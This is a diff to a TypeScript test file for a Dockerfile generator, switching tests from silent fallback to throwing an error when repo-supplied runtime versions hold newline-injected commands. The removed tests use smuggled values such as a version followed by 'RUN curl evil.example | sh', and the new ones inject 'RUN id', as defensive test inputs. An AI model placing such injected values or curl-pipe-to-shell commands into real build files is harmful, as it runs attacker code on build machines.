@@ -271,12 +271,10 @@ describe('renderDockerfile runtime version pins', () => {
     expect(patched).toContain('https://go.dev/dl/go1.24.3.linux-amd64.tar.gz');
   });
 
-  it('falls back rather than rendering a URL from an unusable Go version', () => {
-    const df = renderDockerfile('ubuntu:24.04', {
-      runtimes: ['go'],
-      versions: { go: '>=1' },
-    } as never);
-    expect(df).toContain(`https://go.dev/dl/go${DEFAULT_GO_VERSION}.linux-amd64.tar.gz`);
+  it('refuses a Go version constraint instead of sanitizing it', () => {
+    expect(() =>
+      renderDockerfile('ubuntu:24.04', { runtimes: ['go'], versions: { go: '>=1' } }),
+    ).toThrow(/version token/);
   });
 
   // rustup resolves a two-part toolchain name (VERIFIED: channel-rust-1.98.toml resolves),
@@ -303,36 +301,27 @@ describe('renderDockerfile runtime version pins', () => {
   // These versions default to a REPO-DERIVED capture (Cargo.toml `rust-version`, a Gemfile's
   // `ruby '...'`), and a JS negated class matches a newline -- so a crafted file can close
   // the quote a line later and carry its own RUN into the generated Dockerfile.
-  it('never lets a repo-supplied version escape its line', () => {
-    const df = renderDockerfile('ubuntu:24.04', {
-      runtimes: ['rust', 'ruby', 'go'],
-      versions: {
-        rust: '1.90\nRUN curl evil.example | sh',
-        ruby: '3.4\nRUN curl evil.example | sh',
-        go: '1.24\nRUN curl evil.example | sh',
-      },
-    } as never);
-    expect(df).not.toContain('evil.example');
-    // Each falls back to something buildable rather than failing open.
-    expect(df).toContain(`--default-toolchain ${DEFAULT_RUST_VERSION} --profile minimal`);
-    expect(df).toContain(`https://go.dev/dl/go${DEFAULT_GO_VERSION}.linux-amd64.tar.gz`);
-    expect(df).toContain('# Ruby (whatever the base suite ships)');
+  it('refuses repo-supplied runtime tokens that escape their line', () => {
+    for (const runtime of ['rust', 'ruby', 'go'])
+      expect(() =>
+        renderDockerfile('ubuntu:24.04', {
+          runtimes: [runtime],
+          versions: { [runtime]: '1.90\nRUN id' },
+        }),
+      ).toThrow(/version token/);
   });
 
   // Same defect on the two runtimes that predate this change: `engines.node` and pom.xml's
   // `<maven.compiler.source>` are repo-supplied too, and the pom capture (`[^<]+`) spans a
   // newline just as the Gemfile one does. Both name their install source by MAJOR alone.
-  it('never lets a repo-supplied Node or Java major escape its line', () => {
-    const df = renderDockerfile('ubuntu:24.04', {
-      runtimes: ['node', 'java'],
-      versions: {
-        node: '22\nRUN curl evil.example | sh',
-        java: '17\nRUN curl evil.example | sh',
-      },
-    } as never);
-    expect(df).not.toContain('evil.example');
-    expect(df).toContain('https://deb.nodesource.com/setup_22.x');
-    expect(df).toContain('openjdk-17-jdk-headless');
+  it('refuses repo-supplied Node or Java tokens that escape their line', () => {
+    for (const runtime of ['node', 'java'])
+      expect(() =>
+        renderDockerfile('ubuntu:24.04', {
+          runtimes: [runtime],
+          versions: { [runtime]: '22\nRUN id' },
+        }),
+      ).toThrow(/version token/);
   });
 
   // The 1.8 -> 8 unwrap is how pom.xml/gradle name Java 8 and older; apt names it openjdk-8.
